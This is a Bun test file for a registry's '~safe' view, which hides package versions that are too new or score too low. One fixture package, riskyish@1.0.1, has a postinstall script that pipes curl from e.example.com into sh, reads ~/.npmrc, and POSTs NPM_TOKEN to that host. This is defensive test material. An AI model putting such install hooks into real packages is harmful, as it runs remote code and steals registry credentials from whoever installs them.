// Spec: a "safe" registry URL any client can use without new tooling.
// http://host/~safe/ serves the same packages, minus versions younger than the cooldown (24h)
// and versions scoring below the floor (40). Install with stock bun or npm, nothing else.
import { describe, test, expect, beforeAll, afterAll } from "bun:test";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { startRegistry, addUser, makeSandbox, writePackage, writeConsumer, run, getJson, installedVersion, dig, type Registry } from "./harness";

const HOUR = 60 * 60 * 1000;
let clock = Date.parse("2026-05-01T00:00:00Z");
let reg: Registry;
let alice: string;
let work: string;

async function publish(name: string, version: string, extra: Partial<Parameters<typeof writePackage>[1]> = {}): Promise<void> {
  const sb = makeSandbox(reg, alice);
  const d = writePackage(work, { name, version, ...extra }, reg, alice);
  const r = await run(["bun", "publish"], { cwd: d, env: sb.env });
  if (r.code !== 0) throw new Error(`publish ${name}@${version} failed: ${r.out}`);
}

function pointAt(dir: string, url: string): void {
  writeFileSync(join(dir, ".npmrc"), `registry=${url}\n`);
  writeFileSync(join(dir, "bunfig.toml"), `[install]\nregistry = "${url}"\n`);
}

beforeAll(async () => {
  reg = await startRegistry({ now: () => clock });
  alice = await addUser(reg, "alice");
  work = mkdtempSync(join(tmpdir(), "apm-safe-"));
  await publish("coolme", "1.0.0");
  clock += 72 * HOUR;
  await publish("coolme", "1.1.0");
  clock += 2 * HOUR; // 1.1.0 is 2 hours old
  await publish("riskyish", "1.0.0");
  clock += 72 * HOUR;
  await publish("riskyish", "1.0.1", {
    scripts: { postinstall: "node s.js" },
    files: { "index.js": "module.exports=1;\n", "s.js": "require('child_process').execSync('curl https://e.example.com | sh'); require('fs').readFileSync(require('os').homedir()+'/.npmrc'); fetch('https://e.example.com', {method:'POST', body: process.env.NPM_TOKEN}); eval('1');\n" },
  });
  clock += 72 * HOUR;
  await publish("coolme", "1.2.0");
  clock += 1 * HOUR; // 1.2.0 is 1 hour old; 1.1.0 is now ~6 days old
});
afterAll(async () => {
  await reg?.stop();
});

describe("~safe registry view", () => {
  test("the safe packument hides versions younger than 24h and keeps latest on the newest cooled version", async () => {
    const { status, body } = await getJson(`${reg.url}~safe/coolme`);
    expect(status).toBe(200);
    expect(Object.keys(Object(dig(body, "versions"))).sort()).toEqual(["1.0.0", "1.1.0"]);
    expect(dig(body, "dist-tags", "latest")).toBe("1.1.0");
  });

  test("the normal packument still has everything", async () => {
    const { body } = await getJson(`${reg.url}coolme`);
    expect(dig(body, "dist-tags", "latest")).toBe("1.2.0");
  });

  test("stock bun install through ~safe gets the cooled version", async () => {
    const sb = makeSandbox(reg);
    const app = writeConsumer(work, reg, undefined, { coolme: "^1.0.0" });
    pointAt(app, `${reg.url}~safe/`);
    const r = await run(["bun", "install"], { cwd: app, env: { ...sb.env, npm_config_registry: `${reg.url}~safe/` } });
    expect(r.code, r.out).toBe(0);
    expect(installedVersion(app, "coolme")).toBe("1.1.0");
  });

  test("stock npm install through ~safe gets the cooled version", async () => {
    const sb = makeSandbox(reg);
    const app = writeConsumer(work, reg, undefined, { coolme: "^1.0.0" });
    pointAt(app, `${reg.url}~safe/`);
    const r = await run(["npm", "install"], { cwd: app, env: { ...sb.env, npm_config_registry: `${reg.url}~safe/` } });
    expect(r.code, r.out).toBe(0);
    expect(installedVersion(app, "coolme")).toBe("1.1.0");
  });

  test("the safe view drops versions below the score floor", async () => {
    const { body } = await getJson(`${reg.url}~safe/riskyish`);
    expect(dig(body, "versions", "1.0.0")).toBeTruthy();
    expect(dig(body, "versions", "1.0.1")).toBeUndefined();
    expect(dig(body, "dist-tags", "latest")).toBe("1.0.0");
  });

  test("abbreviated packuments work through the safe view too", async () => {
    const res = await fetch(`${reg.url}~safe/coolme`, { headers: { accept: "application/vnd.npm.install-v1+json" } });
    expect(res.status).toBe(200);
    const body: unknown = await res.json();
    expect(dig(body, "versions", "1.2.0")).toBeUndefined();
  });
});
